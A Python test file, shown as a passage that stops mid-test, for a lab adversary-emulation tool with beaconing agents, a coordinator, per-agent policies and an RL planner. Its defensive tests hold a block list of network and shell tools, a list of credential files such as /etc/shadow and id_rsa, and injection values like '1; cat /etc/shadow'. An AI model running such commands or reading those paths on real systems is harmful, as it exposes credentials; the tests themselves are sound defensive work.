def test_beacon_does_not_block_on_an_idle_keepalive_connection(beacon) -> None:
    """One agent holding a connection open must not stall every other agent."""
    server, _ = beacon
    host, port = server.url.removeprefix("http://").split(":")
    headers = {"Content-Type": "application/json", "X-Caldera-Token": server.token}

    holder = http.client.HTTPConnection(host, int(port), timeout=10)
    holder.request("POST", "/register", json.dumps({"agent_id": "holder"}), headers)
    assert holder.getresponse().status == 200
    try:
        # The holder's keep-alive socket is still open and idle here.
        other = http.client.HTTPConnection(host, int(port), timeout=5)
        other.request("POST", "/register", json.dumps({"agent_id": "other"}), headers)
        assert other.getresponse().status == 200
        other.close()
    finally:
        holder.close()


def test_concurrent_agents_never_receive_the_same_ability(catalog: AbilityCatalog) -> None:
    state = BeaconState(catalog, queue=_ungated(catalog))
    server = BeaconServer(state).start()
    try:
        agents = [
            BeaconAgent(catalog, DryRunExecutor(), server.url, server.token, LabPolicy())
            for _ in range(4)
        ]
        executed: list[list[str]] = []
        threads = [
            threading.Thread(target=lambda a=agent: executed.append(a.run(max_beacons=8)))
            for agent in agents
        ]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join(timeout=20)
        assert all(not thread.is_alive() for thread in threads)
        assigned = [ability for run in executed for ability in run]
        assert sorted(assigned) == sorted(_ungated(catalog))
        assert len(assigned) == len(set(assigned))
    finally:
        server.stop()


def test_beacon_emits_audit_events(catalog: AbilityCatalog) -> None:
    seen: list[tuple[str, dict[str, object]]] = []
    state = BeaconState(
        catalog,
        queue=("collect-host-identity",),
        on_event=lambda name, details: seen.append((name, details)),
    )
    server = BeaconServer(state).start()
    try:
        agent = BeaconAgent(catalog, DryRunExecutor(), server.url, server.token, LabPolicy())
        agent.run(max_beacons=2)
    finally:
        server.stop()
    names = [name for name, _ in seen]
    assert names[0] == "agent.registered"
    assert "agent.tasked" in names and "agent.reported" in names
    tasked = next(details for name, details in seen if name == "agent.tasked")
    assert tasked["ability_id"] == "collect-host-identity"
    assert tasked["queue_remaining"] == 0
    reported = next(details for name, details in seen if name == "agent.reported")
    # The event describes the result; it does not duplicate the collected bytes.
    assert "stdout" not in reported
    assert reported["stdout_bytes"] > 0


def test_serve_cli_writes_beacon_events_to_the_audit_log(tmp_path: Path, capsys) -> None:
    log = tmp_path / "events.jsonl"
    cli.main(
        ["serve", "--executor", "dry-run", "--steps", "4", "--agents", "3", "--log", str(log)]
    )
    capsys.readouterr()
    records = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
    assert len({record["run_id"] for record in records}) == 1
    # The coordinator's decisions and the beacon traffic land in one log.
    names = {record["event"] for record in records}
    assert {"agent.registered", "agent.tasked", "agent.reported"} <= names
    assert {"plan.created", "ability.approved", "ability.completed"} <= names
    reported = [r for r in records if r["event"] == "agent.reported"]
    assert len(reported) == 4
    # Three agents shared one budget of four; none of them ran the same ability.
    assert len({r["details"]["ability_id"] for r in reported}) == 4
    assert len({r["details"]["agent_id"] for r in reported}) <= 3


def test_report_summarises_a_beacon_run(catalog: AbilityCatalog, tmp_path: Path, capsys) -> None:
    log = tmp_path / "events.jsonl"
    cli.main(
        ["serve", "--executor", "dry-run", "--steps", "4", "--agents", "2", "--log", str(log)]
    )
    capsys.readouterr()
    runs = summarize(load_events(log))
    summary = next(iter(runs.values()))
    assert len(summary.agents) == 2
    assert summary.beacon_tasks == 4
    # Counted once, though both ability.completed and agent.reported are present.
    assert summary.executions == 4
    rendered = render(catalog, runs)
    assert "agents: 2 beaconing, 4 ability tasks dispatched" in rendered
    # Coverage is derived from beacon results as well as orchestrator runs.
    covered = [row for row in coverage(catalog, runs) if row["successes"]]
    assert len(covered) == 4


def test_beacon_run_goes_through_the_planner_and_rl(tmp_path: Path, capsys) -> None:
    log = tmp_path / "events.jsonl"
    table = tmp_path / "q.json"
    cli.main(
        [
            "serve", "--executor", "dry-run", "--planner", "rules",
            "--steps", "4", "--agents", "2",
            "--log", str(log), "--q-table", str(table),
        ]
    )
    capsys.readouterr()
    records = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
    names = [record["event"] for record in records]
    # The beacon queue is not a second, dumber planner: the same decisions,
    # rewards and learning appear as in a sequential run.
    assert names.count("plan.created") == 1
    assert names.count("ability.approved") == 4
    assert names.count("reward.scored") == 4
    assert table.exists()
    saved = json.loads(table.read_text(encoding="utf-8"))
    assert saved["entries"]


def test_coordinator_budget_is_shared_across_agents(catalog: AbilityCatalog) -> None:
    coordinator = Coordinator(catalog, planner_mode="rules", max_steps=3)
    state = BeaconState(
        catalog,
        task_source=coordinator.next_ability,
        result_sink=lambda agent_id, entry: None,
    )
    server = BeaconServer(state).start()
    try:
        agents = [
            BeaconAgent(catalog, DryRunExecutor(), server.url, server.token, LabPolicy())
            for _ in range(4)
        ]
        threads = [threading.Thread(target=agent.run, args=(8,)) for agent in agents]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join(timeout=20)
        assert all(not thread.is_alive() for thread in threads)
    finally:
        server.stop()
    # Four agents, a budget of three: the budget wins.
    approved = [event for event in coordinator.events if event.event == "ability.approved"]
    assert len(approved) == 3
    assert len({event.details["ability_id"] for event in approved}) == 3


def test_coordinator_applies_the_policy_to_beacon_agents(catalog: AbilityCatalog) -> None:
    policy = LabPolicy(approved_abilities=frozenset({"collect-host-identity"}))
    coordinator = Coordinator(catalog, policy=policy, planner_mode="rules", max_steps=4)
    # The planner may propose anything; the policy still decides what is handed out.
    handed = [coordinator.next_ability("agent-1") for _ in range(4)]
    assert handed == ["collect-host-identity", None, None, None]
    withheld = [event for event in coordinator.events if event.event == "ability.withheld"]
    assert withheld and withheld[0].details["agent_id"] == "agent-1"


def test_agents_can_be_held_to_different_policies(catalog: AbilityCatalog) -> None:
    restricted = LabPolicy(approved_abilities=frozenset({"collect-host-identity"}))
    coordinator = Coordinator(
        catalog,
        planner_mode="rules",
        max_steps=6,
        agent_policies={"restricted": restricted},
    )
    # The restricted agent may only ever be offered its one ability.
    assert coordinator.next_ability("restricted") == "collect-host-identity"
    assert coordinator.next_ability("restricted") is None
    # The unrestricted agent still gets the rest of the catalog.
    trusted = [coordinator.next_ability("trusted") for _ in range(3)]
    assert all(ability is not None for ability in trusted)
    assert "collect-host-identity" not in trusted


def test_a_restricted_agent_does_not_stall_the_run(catalog: AbilityCatalog) -> None:
    # Withholding must not consume the budget or raise; other agents carry on.
    coordinator = Coordinator(
        catalog,
        planner_mode="rules",
        max_steps=3,
        agent_policies={"blocked": LabPolicy(approved_abilities=frozenset())},
    )
    assert coordinator.next_ability("blocked") is None
    handed = [coordinator.next_ability("open") for _ in range(3)]
    assert all(ability is not None for ability in handed)
    approved = [e for e in coordinator.events if e.event == "ability.approved"]
    assert len(approved) == 3
    assert {e.details["policy"] for e in approved} == {"lab"}


def test_agent_policy_is_recorded_in_the_audit_event(catalog: AbilityCatalog) -> None:
    coordinator = Coordinator(
        catalog,
        planner_mode="rules",
        max_steps=2,
        agent_policies={"scoped": LabPolicy()},
    )
    coordinator.next_ability("scoped")
    approved = next(e for e in coordinator.events if e.event == "ability.approved")
    assert approved.details["policy"] == "agent"


def test_orchestrator_and_beacon_share_one_coordinator_contract(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    orchestrator = Orchestrator(catalog, DryRunExecutor(), planner_mode="rules")
    events = orchestrator.run(4, tmp_path / "seq.jsonl")
    sequential = [event.event for event in events]
    assert sequential.count("ability.approved") == 4
    assert sequential.count("reward.scored") == 4
    # Same event vocabulary as the beacon path, produced by the same object.
    assert isinstance(orchestrator.coordinator, Coordinator)


def test_every_ability_is_read_only_discovery(catalog: AbilityCatalog) -> None:
    """The catalog must stay within the scope SECURITY.md declares."""
    writing = {"rm", "mv", "cp", "tee", "dd", "chmod", "chown", "ln", "mkdir", "touch", "truncate"}
    networking = {"curl", "wget", "nc", "netcat", "ssh", "scp", "ping", "nmap", "telnet"}
    shells = {"sh", "bash", "ash", "zsh", "python", "python3", "perl", "eval"}
    for ability in catalog.all():
        binary = ability.command[0]
        assert binary not in writing, f"{ability.id} runs a writing command"
        assert binary not in networking, f"{ability.id} reaches the network"
        assert binary not in shells, f"{ability.id} spawns a shell"
        assert ability.tactic == "discovery"
        assert ability.risk == "low"
        assert not ability.requires_network
        # A shell string smuggled into an argv array would defeat the allowlist.
        assert not any(char in part for part in ability.command for char in "|;&$`><")


def test_no_ability_reads_a_credential_store(catalog: AbilityCatalog) -> None:
    forbidden = ("/etc/shadow", "/etc/gshadow", ".ssh", "id_rsa", ".aws", ".netrc", "/proc/kcore")
    for ability in catalog.all():
        joined = " ".join(ability.command)
        for needle in forbidden:
            assert needle not in joined, f"{ability.id} touches {needle}"


def test_coverage_counts_techniques_not_abilities(catalog: AbilityCatalog) -> None:
    # A follow-up that inspects what its parent found is the same technique, so
    # abilities and techniques are no longer one to one and counting rows would
    # report ability coverage under a technique label.
    techniques = [ability.technique for ability in catalog.all()]
    assert len(techniques) > len(set(techniques))
    rows = [{"technique": technique, "successes": 0} for technique in techniques]
    assert technique_coverage(rows) == (0, len(set(techniques)))
    rows[0]["successes"] = 1
    assert technique_coverage(rows) == (1, len(set(techniques)))


def test_every_ability_id_is_unique_and_stable(catalog: AbilityCatalog) -> None:
    # AbilityCatalog stores by id, so a duplicate would silently drop an entry.
    raw = json.loads((ROOT / "catalog" / "abilities.json").read_text(encoding="utf-8"))
    ids = [entry["id"] for entry in raw["abilities"]]
    assert len(ids) == len(set(ids)) == len(catalog.ids())


def test_catalog_fits_the_default_step_budget(catalog: AbilityCatalog) -> None:
    # Otherwise a full sweep silently truncates and coverage looks incomplete.
    assert len(catalog.ids()) <= LabPolicy().max_steps


def test_network_interface_patterns_mask_counters(catalog: AbilityCatalog) -> None:
    ability = catalog.get("collect-network-interfaces")
    sample = "    lo:  1024      8    0    0    0     0          0         0"
    later = "    lo:  9999     42    0    0    0     0          0         0"
    facts = RewardModel.facts(sample, ability.volatile_patterns)
    assert facts == RewardModel.facts(later, ability.volatile_patterns)
    # The interface name survives; only the counters are masked.
    assert "lo:" in facts[0]


def _slow_ability(seconds: int = 30) -> Ability:
    return Ability(
        id="collect-host-identity",
        name="Slow stand-in",
        tactic="discovery",
        technique="T0000",
        command=("sleep", str(seconds)),
        description="Only used to drive the timeout path.",
    )


def test_local_executor_reports_a_timeout_distinctly(tmp_path: Path) -> None:
    result = LocalLabExecutor(tmp_path).execute(_slow_ability(), LabPolicy(timeout_seconds=1))
    assert result.status == "timed-out"
    assert result.return_code == -1
    assert "lab timeout" in result.stderr
    assert result.duration_seconds >= 1.0


def test_a_timeout_is_never_counted_as_success() -> None:
    assert "timed-out" not in SUCCESS_STATUSES
    breakdown = RewardModel().score(_result("partial\n", status="timed-out"), LabPolicy())
    assert breakdown.outcome == -1.0
    assert breakdown.information_gain == 0.0


def test_report_counts_a_timeout_as_a_failure(catalog: AbilityCatalog, tmp_path: Path) -> None:
    log = tmp_path / "events.jsonl"
    log.write_text(
        json.dumps(
            {
                "timestamp": "2026-01-01T00:00:00Z",
                "run_id": "r1",
                "event": "ability.completed",
                "details": {
                    "ability_id": "collect-host-identity",
                    "status": "timed-out",
                    "isolation": "docker",
                    "duration_seconds": 20.0,
                },
            }
        )
        + "\n",
        encoding="utf-8",
    )
    summary = next(iter(summarize(load_events(log)).values()))
    assert sum(summary.failed.values()) == 1
    assert sum(summary.succeeded.values()) == 0


def test_docker_executor_names_its_container_for_cleanup() -> None:
    # Without --name a timed-out container cannot be found and removed, because
    # --rm only runs if the client survives.
    recorded: list[list[str]] = []

    class _Timeout:
        def __call__(self, command, **kwargs):
            recorded.append(command)
            if command[:3] == ["docker", "rm", "--force"]:
                return subprocess.CompletedProcess(command, 0, "", "")
            raise subprocess.TimeoutExpired(command, 1)

    executor = DockerLabExecutor(startup_grace_seconds=0.1)
    with mock.patch.object(subprocess, "run", _Timeout()):
        result = executor.execute(_slow_ability(), LabPolicy(timeout_seconds=1))

    assert result.status == "timed-out"
    run_command = recorded[0]
    name = run_command[run_command.index("--name") + 1]
    assert name.startswith("caldera-lab-")
    # The abandoned container is force-removed, not left running.
    assert recorded[1] == ["docker", "rm", "--force", name]


def test_docker_executor_cleans_up_after_a_spawn_failure() -> None:
    recorded: list[list[str]] = []

    def _oserror(command, **kwargs):
        recorded.append(command)
        if command[:3] == ["docker", "rm", "--force"]:
            return subprocess.CompletedProcess(command, 0, "", "")
        raise OSError("docker is not installed")

    with mock.patch.object(subprocess, "run", _oserror):
        result = DockerLabExecutor().execute(_slow_ability(), LabPolicy())

    assert result.status == "failed"
    assert recorded[1][:3] == ["docker", "rm", "--force"]


def test_agent_retries_a_dropped_connection(catalog: AbilityCatalog, beacon) -> None:
    server, _ = beacon
    agent = BeaconAgent(
        catalog, DryRunExecutor(), server.url, server.token, LabPolicy(), backoff_seconds=0.01
    )
    real = agent._request
    calls = {"n": 0}

    def flaky(path: str, payload: dict[str, object]) -> dict[str, object]:
        calls["n"] += 1
        if calls["n"] == 1:
            raise urllib.error.URLError("connection reset")
        return real(path, payload)

    with mock.patch.object(agent, "_request", flaky):
        agent.register()
    assert agent.transport_errors == 1


def test_agent_gives_up_after_its_retry_budget(catalog: AbilityCatalog) -> None:
    agent = BeaconAgent(
        catalog,
        DryRunExecutor(),
        "http://127.0.0.1:1",
        "token",
        LabPolicy(),
        attempts=2,
        backoff_seconds=0.01,
    )
    with pytest.raises(ConnectionError, match="after 2 attempts"):
        agent.register()
    assert agent.transport_errors == 2


def test_agent_does_not_retry_a_rejected_token(catalog: AbilityCatalog, beacon) -> None:
    server, _ = beacon
    agent = BeaconAgent(
        catalog, DryRunExecutor(), server.url, "wrong-token", LabPolicy(), backoff_seconds=0.01
    )
    with pytest.raises(BeaconUnauthorised):
        agent.register()
    # Retrying a bad token only wastes time; it is not a transport problem.
    assert agent.transport_errors == 0


def test_agent_reregisters_when_the_server_forgot_it(catalog: AbilityCatalog, beacon) -> None:
    server, state = beacon
    agent = BeaconAgent(catalog, DryRunExecutor(), server.url, server.token, LabPolicy())
    agent.register()
    # Simulate a server restart that lost its agent table.
    state.agents.clear()
    assert isinstance(agent._post("/beacon", {}).get("ability_id"), str)
    assert agent.reregistrations == 1
    assert agent.agent_id in state.agents


def test_serve_cli_restricts_a_named_agent(tmp_path: Path, capsys) -> None:
    log = tmp_path / "events.jsonl"
    cli.main(
        [
            "serve", "--executor", "dry-run", "--planner", "rules",
            "--steps", "6", "--agents", "3",
            "--agent-policy", "agent-2=collect-host-identity",
            "--no-q-table", "--log", str(log),
        ]
    )
    out = capsys.readouterr().out
    assert "agent-2 (restricted)" in out
    records = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
    approved = [r for r in records if r["event"] == "ability.approved"]
    restricted = [r for r in approved if r["details"]["agent_id"] == "agent-2"]
    # The invariant is what it may run, not that it is guaranteed work: another
    # agent can take its one permitted ability first, and starvation is the
    # correct outcome of a shared budget rather than a failure.
    assert all(r["details"]["ability_id"] == "collect-host-identity" for r in restricted)
    assert all(r["details"]["policy"] == "agent" for r in restricted)
    assert len(approved) > len(restricted)
    if not restricted:
        withheld = [r for r in records if r["event"] == "ability.withheld"]
        assert any(r["details"]["agent_id"] == "agent-2" for r in withheld)


def test_an_agent_with_alternatives_yields_a_scarce_ability(catalog: AbilityCatalog) -> None:
    """An open agent must not casually consume another agent's only option."""
    only = catalog.ids()[0]
    coordinator = Coordinator(
        catalog,
        planner_mode="rules",
        max_steps=4,
        agent_policies={"narrow": LabPolicy(approved_abilities=frozenset({only}))},
    )
    assert coordinator.next_ability("open") != only
    assert coordinator.next_ability("narrow") == only
    deferred = [event for event in coordinator.events if event.event == "ability.deferred"]
    assert deferred[0].details["abilities"] == [only]


def test_reservation_is_a_preference_not_a_deadlock(catalog: AbilityCatalog) -> None:
    # If the restricted agent never beacons, the reserved ability must still be
    # handed out rather than stalling the run at the end.
    available = _ungated(catalog)
    only = available[0]
    coordinator = Coordinator(
        catalog,
        planner_mode="rules",
        max_steps=len(available),
        agent_policies={"absent": LabPolicy(approved_abilities=frozenset({only}))},
    )
    # Nothing has reported, so only the abilities needing no facts are on offer.
    handed = [coordinator.next_ability("open") for _ in range(len(available))]
    assert None not in handed
    assert handed[-1] == only  # taken last, but taken


def test_reservation_only_defers_for_agents_that_lack_alternatives(
    catalog: AbilityCatalog,
) -> None:
    # An agent with several permitted abilities is not scarce, so nothing is
    # reserved on its behalf.
    roomy = frozenset(catalog.ids()[:4])
    coordinator = Coordinator(
        catalog,
        planner_mode="rules",
        max_steps=2,
        agent_policies={"roomy": LabPolicy(approved_abilities=roomy)},
    )
    coordinator.next_ability("open")
    assert not [event for event in coordinator.events if event.event == "ability.deferred"]


def test_serve_cli_rejects_an_unknown_ability_in_a_policy() -> None:
    with pytest.raises(SystemExit):
        cli.main(
            ["serve", "--executor", "dry-run", "--agent-policy", "agent-1=not-an-ability"]
        )


def test_serve_cli_rejects_a_malformed_policy_spec() -> None:
    with pytest.raises(SystemExit):
        cli.main(["serve", "--executor", "dry-run", "--agent-policy", "missing-equals"])


def test_state_is_built_from_issued_not_completed_work(catalog: AbilityCatalog) -> None:
    coordinator = Coordinator(catalog, planner_mode="rules", max_steps=4)
    first = coordinator.next_ability("a")
    second = coordinator.next_ability("b")
    assert first != second
    approved = [e for e in coordinator.events if e.event == "ability.approved"]
    assert len(approved) == 2
    # Neither has reported yet. Built from completions, both hand-outs would
    # have shared the empty state and fought over one table entry.
    pending_states = {value[0] for value in coordinator._pending.values()}
    assert len(pending_states) == 2
    assert coordinator.rl.state_from(set(), "clean") in pending_states


def test_concurrent_dispatch_keeps_states_distinct(catalog: AbilityCatalog) -> None:
    coordinator = Coordinator(catalog, planner_mode="rules", max_steps=6)
    handed = [coordinator.next_ability(f"agent-{i}") for i in range(6)]
    assert len(set(handed)) == 6
    seen = [value[0] for value in coordinator._pending.values()]
    assert len(set(seen)) == 6


def test_sequential_state_sequence_is_unchanged(catalog: AbilityCatalog) -> None:
    # Issued and completed coincide when one agent runs at a time, so a
    # single-agent run must produce exactly the states it produced before.
    orchestrator = Orchestrator(catalog, DryRunExecutor(), planner_mode="rules")
    orchestrator.run(4)
    states = sorted(key[0] for key in orchestrator.rl.q)
    assert states[0] == "000|0|clean"
    assert all(state.endswith("|clean") for state in states)
    assert len(set(states)) == 4


def test_state_from_matches_the_observation_derived_state(catalog: AbilityCatalog) -> None:
    policy = QPolicy(catalog)
    observations = ("collect-host-identity:succeeded:0", "collect-system-info:succeeded:0")
    committed = {"collect-host-identity", "collect-system-info"}
    assert policy.state(observations) == policy.state_from(
        committed, "clean", traits=frozenset(), step=len(committed)
    )
    produced = ("collect-process-list:succeeded:0",)
    assert policy.state(produced) == policy.state_from(
        {"collect-process-list"}, "clean", traits={"host.process.pid"}, step=1
    )


def _completed(ability_id: str, status: str = "succeeded", run_id: str = "r1") -> str:
    return json.dumps(
        {
            "timestamp": "2026-01-01T00:00:00Z",
            "run_id": run_id,
            "event": "ability.completed",
            "details": {
                "ability_id": ability_id,
                "status": status,
                "isolation": "docker",
                "duration_seconds": 1.0,
            },
        }
    )


def test_status_document_reports_unknown_without_runs(catalog: AbilityCatalog) -> None:
    document = status_document(catalog, {})
    assert document["schema"] == STATUS_SCHEMA
    assert document["state"] == "unknown"
    assert document["last_run_at"] == ""


def test_status_document_flattens_every_value_to_a_string(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    """The consumer renders label/value pairs and knows nothing about this lab."""
    log = tmp_path / "events.jsonl"
    log.write_text(_completed("collect-host-identity") + "\n", encoding="utf-8")
    document = status_document(catalog, summarize(load_events(log)))
    assert isinstance(document["metrics"], list)
    for metric in document["metrics"]:
        assert set(metric) == {"label", "value"}
        assert isinstance(metric["label"], str)
        assert isinstance(metric["value"], str)


def test_status_document_warns_on_a_failure(catalog: AbilityCatalog, tmp_path: Path) -> None:
    log = tmp_path / "events.jsonl"
    log.write_text(_completed("collect-host-identity", status="failed") + "\n", encoding="utf-8")
    document = status_document(catalog, summarize(load_events(log)))
    assert document["state"] == "warn"
    assert "1 failed" in document["headline"]


def test_status_document_is_ok_only_with_full_coverage(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    log = tmp_path / "events.jsonl"
    log.write_text(
        "\n".join(_completed(ability.id) for ability in catalog.all()) + "\n", encoding="utf-8"
    )
    document = status_document(catalog, summarize(load_events(log)))
    assert document["state"] == "ok"
    techniques = len({ability.technique for ability in catalog.all()})
    assert document["headline"] == f"{techniques}/{techniques} techniques covered"


def test_report_status_writes_the_document_instead_of_the_table(tmp_path: Path, capsys) -> None:
    log = tmp_path / "events.jsonl"
    log.write_text(_completed("collect-host-identity") + "\n", encoding="utf-8")
    status = tmp_path / "status.json"
    cli.main(["report", "--log", str(log), "--status", str(status)])
    document = json.loads(status.read_text(encoding="utf-8"))
    assert document["schema"] == STATUS_SCHEMA
    assert "ATT&CK coverage" not in capsys.readouterr().out


def test_run_publishes_a_status_file_next_to_the_log(tmp_path: Path) -> None:
    log = tmp_path / "run.jsonl"
    cli.main(
        ["run", "--executor", "dry-run", "--steps", "2", "--log", str(log), "--no-q-table"]
    )
    document = json.loads((tmp_path / "status.json").read_text(encoding="utf-8"))
    assert document["schema"] == STATUS_SCHEMA
    assert document["last_run_at"]


def test_no_status_leaves_the_control_room_file_alone(tmp_path: Path) -> None:
    log = tmp_path / "run.jsonl"
    cli.main(
        [
            "run",
            "--executor",
            "dry-run",
            "--steps",
            "2",
            "--log",
            str(log),
            "--no-q-table",
            "--no-status",
        ]
    )
    assert not (tmp_path / "status.json").exists()


def _states_of(coordinator: Coordinator) -> set[str]:
    return {value[0] for value in coordinator._pending.values()}


def _executed(ability_id: str, status: str = "succeeded") -> ExecutionResult:
    return ExecutionResult(ability_id, status, f"output for {ability_id}", "", 0, "dry-run", 0.1)


def test_a_concurrent_burst_asks_for_states_a_sequential_run_also_visits(
    catalog: AbilityCatalog,
) -> None:
    """The two modes have to share a table or learning in one is dead weight
    in the other. Mid-burst nothing has completed, so an outcome component
    meaning "how the last step ended" put the burst on keys sequential runs
    never wrote."""
    sequential = Coordinator(catalog, planner_mode="rules", max_steps=4)
    visited: set[str] = set()
    while (ability_id := sequential.next_ability()) is not None:
        visited |= _states_of(sequential)
        sequential.record_result(_executed(ability_id))

    concurrent = Coordinator(catalog, planner_mode="rules", max_steps=4)
    for index in range(4):
        concurrent.next_ability(f"agent-{index + 1}")
    assert _states_of(concurrent) <= visited


def test_a_failure_marks_the_run_degraded_for_good(catalog: AbilityCatalog) -> None:
    coordinator = Coordinator(catalog, planner_mode="rules", max_steps=3)
    first = coordinator.next_ability()
    coordinator.record_result(_executed(first, status="failed"))
    second = coordinator.next_ability()
    assert all(state.endswith("|degraded") for state in _states_of(coordinator))
    # Recovering does not erase it: "nothing has gone wrong yet" is no longer true.
    coordinator.record_result(_executed(second))
    coordinator.next_ability()
    assert all(state.endswith("|degraded") for state in _states_of(coordinator))


def test_state_from_refuses_an_outcome_it_does_not_model(catalog: AbilityCatalog) -> None:
    with pytest.raises(ValueError):
        QPolicy(catalog).state_from(set(), "succeeded")


def test_a_table_from_the_previous_state_layout_is_refused(
    catalog: AbilityCatalog, tmp_path: Path
) -> None:
    """Version 1 keys carried "|succeeded" and "|none" and mean something else now."""
    path = tmp_path / "q.json"
    policy = QPolicy(catalog)
    path.write_text(
        json.dumps(
            {
                "version": 1,
                "catalog": policy.fingerprint(),
                "entries": [
                    {"state": "0" * 8 + "|none", "action": catalog.ids()[0], "value": 4.0}
                ],
            }
        ),
        encoding="utf-8",
    )
    assert policy.load(path) is False
    assert policy.q == {}


def _catalog_from(document: object, tmp_path: Path) -> AbilityCatalog:
    path = tmp_path / "abilities.json"
    path.write_text(json.dumps(document), encoding="utf-8")
    return AbilityCatalog.from_json(path)


def _minimal(**overrides: object) -> dict[str, object]:
    ability = {
        "id": "probe",
        "name": "Probe",
        "tactic": "discovery",
        "technique": "T0001",
        "command": ["cat", "/proc/{host.process.pid}/status"],
        "description": "d",
        "requires": ["host.process.pid"],
    }
    ability.update(overrides)
    return ability


def _producer(**overrides: object) -> dict[str, object]:
    ability = {
        "id": "lister",
        "name": "Lister",
        "tactic": "discovery",
        "technique": "T0002",
        "command": ["ps"],
        "description": "d",
        "produces": [{"trait": "host.process.pid", "pattern": "(?m)^(\\d+)$"}],
    }
    ability.update(overrides)
    return ability


PID_TRAITS = {"host.process.pid": "^[0-9]{1,7}$"}


def test_a_gated_ability_is_not_offered_before_its_facts_exist(
    catalog: AbilityCatalog,
) -> None:
    coordinator = Coordinator(catalog, planner_mode="rules", max_steps=len(catalog.ids()))
    gated = [a.id for a in catalog.all() if a.requires]
    assert gated
    handed = []
    while (ability_id := coordinator.next_ability()) is not None:
        handed.append(ability_id)
    # Nothing has reported, so no facts exist and every gated ability is held back.
    assert not set(handed) & set(gated)


def test_a_fact_unlocks_the_ability_that_depends_on_it(catalog: AbilityCatalog) -> None:
    coordinator = Coordinator(catalog, planner_mode="rules", max_steps=len(catalog.ids()))
    coordinator.start()
    assert not coordinator._available("inspect-process-status")
    coordinator.record_result(
        ExecutionResult(
            "collect-process-list",
            "succeeded",
            "UID PID PPID\nnobody 1 0 x\n",
            "",
            0,
            "dry-run",
            0.1,
        )
    )
    assert coordinator.facts.values("host.process.pid") == ("1",)
    assert coordinator._available("inspect-process-status")


def test_a_binding_is_substituted_into_argv_not_into_a_shell(catalog: AbilityCatalog) -> None:
    ability = catalog.get("inspect-process-status")
    resolved = resolve(catalog, ability, {"host.process.pid": "1"})
    assert resolved.command == ("cat", "/proc/1/status")
    # The template is untouched; resolution produces a new ability.
    assert ability.command == ("cat", "/proc/{host.process.pid}/status")


@pytest.mark.parametrize(
    "value",
    ["../../etc/shadow", "1/../../root", "1; cat /etc/shadow", "-rf", "1 2", "", "self"],
)
def test_a_value_that_does_not_fit_its_trait_is_refused(
    catalog: AbilityCatalog, value: str
) -> None:
    """The value lands inside an argv element, so its shape is the boundary."""
    with pytest.raises(FactRejected):
        resolve(catalog, catalog.get("inspect-process-status"), {"host.process.pid": value})


def test_resolution_refuses_a_binding_the_ability_never_asked_for(tmp_path: Path) -> None:
    catalog = _catalog_from(
        {
            "traits": {**PID_TRAITS, "host.other": "^[a-z]+$"},
            "abilities": [_producer(), _minimal()],
        },
        tmp_path,
    )
    ability = catalog.get("probe")
    swapped = replace(ability, command=("cat", "{host.other}"))
    with pytest.raises(FactRejected):
        resolve(catalog, swapped, {"host.other": "x"})


def test_resolution_refuses_a_missing_binding(catalog: AbilityCatalog) -> None:
    with pytest.raises(FactRejected):
        resolve(catalog, catalog.get("inspect-process-status"), {})


def test_extraction_drops_a_capture_that_does_not_fit_the_trait(tmp_path: Path) -> None:
    catalog = _catalog_from(
        {
            "traits": PID_TRAITS,
            "abilities": [
                _producer(produces=[{"trait": "host.process.pid", "pattern": "(?m)^(.+)$"}]),
                _minimal(),
            ],
        },
        tmp_path,
    )
    facts = extract(catalog, catalog.get("lister"), "12\n../../etc/shadow\n99999999999\n7\n")
    assert [fact.value for fact in facts] == ["12", "7"]


def test_the_agent_refuses_a_value_the_server_made_up(catalog: AbilityCatalog) -> None:
    """A compromised beacon can name an approved ability but not widen its argv."""
    agent = BeaconAgent(
        catalog, DryRunExecutor(), "http://127.0.0.1:1", "t", LabPolicy(), agent_id="a"
    )
    def hostile(path: str, payload: dict[str, object], **_: object) -> dict[str, object]:
        if path != "/beacon":
            return {}
        return {
            "ability_id": "inspect-process-status",
            "bindings": {"host.process.pid": "../../.."},
        }

    with (
        mock.patch.object(agent, "_post", side_effect=hostile),
        pytest.raises(FactRejected),
    ):
        agent.run(max_beacons=2)


def test_a_fixed_queue_cannot_serve_an_ability_that_needs_facts(
    catalog: AbilityCatalog,
) -> None:
    with pytest.raises(BeaconRefused):
        BeaconState(catalog, queue=("inspect-process-status",))


@pytest.mark.parametrize(
    ("document", "message"),
    [
        ({"traits": {}, "abilities": [_minimal()]}, "undeclared trait"),
        (
            {"traits": {"host.process.pid": "[0-9]+"}, "abilities": [_producer(), _minimal()]},
            "anchored",
        ),
        (
            {"traits": PID_TRAITS, "abilities": [_producer(), _minimal(requires=[])]},
            "without requiring it",
        ),
        (
            {
                "traits": PID_TRAITS,
                "abilities": [
                    _producer(produces=[{"trait": "host.process.pid", "pattern": "^(a)(b)$"}]),
                    _minimal(),
                ],
            },
            "one capturing group",
        ),
        ({"traits": PID_TRAITS, "abilities": [_minimal()]}, "No ability produces"),
    ],
)
def test_the_catalog_refuses_a_dependency_it_cannot_honour(
    tmp_path: Path, document: object, message: str
) -> None:
    with pytest.raises(ValueError, match=message):
        _catalog_from(document, tmp_path)


def test_one_agents_discovery_unlocks_work_for_another(catalog: AbilityCatalog) -> None:
    """Facts live in the coordinator, not in an agent, so a run is a shared
    investigation rather than several isolated ones."""
    coordinator = Coordinator(catalog, planner_mode="rules", max_steps=len(catalog.ids()))
    coordinator.start()
    coordinator.record_result(
        ExecutionResult(
            "collect-process-list", "succeeded", "UID PID\nnobody 42 0 x\n", "", 0, "dry-run", 0.1
        ),
        agent_id="finder",
    )
    handed: list[str] = []
    while (assignment := coordinator.next_assignment("other")) is not None:
        handed.append(assignment.ability_id)
        if assignment.ability_id == "inspect-process-status":
            assert assignment.bindings == {"host.process.pid": "42"}
            return
    raise AssertionError(f"the second agent was never offered the unlocked ability: {handed}")


def test_the_plan_orders_the_choice_but_does_not_bound_it(catalog: AbilityCatalog) -> None:
    """A plan is advice. Treating it as the only source made it a whitelist:
    the rule planner proposes a fixed catalog prefix that shrinks as the budget
    is spent, so work unlocked mid-run was never offered."""
    coordinator = Coordinator(catalog, planner_mode="rules", max_steps=3)
    coordinator.start()
    planned = set(coordinator._plan.ability_ids)
